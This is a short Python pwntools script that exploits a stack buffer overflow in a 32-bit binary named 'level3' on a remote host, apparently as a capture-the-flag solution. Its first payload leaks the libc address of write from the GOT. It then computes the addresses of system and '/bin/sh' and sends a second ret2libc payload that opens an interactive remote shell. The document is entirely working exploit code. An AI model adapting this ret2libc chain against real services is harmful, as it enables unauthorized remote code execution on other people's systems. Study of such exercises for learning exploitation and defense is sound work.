from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('111.200.241.244', 51304)
e = ELF('./level3')
write_plt = e.plt['write'] # 0x8048340
info('write_plt => 0x%x', write_plt)
write_got = e.got['write'] # 0x804a018
info('write_got => 0x%x', write_got)
main_address = e.symbols['main'] # 0x8048484
info('main_address => 0x%x', main_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Input:\n', payload)
write_address = u32(io.recv(4)) 
log.success('write_address => %s', hex(write_address))
libc = ELF('./libc/libc_32.so.6')
libcbase = write_address - libc.symbols['write']
log.success('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system'] 
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__() 
log.success('bin_sh_address => 0x%x', bin_sh_address)
payload = b'a'*0x88 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendline(payload)
io.interactive()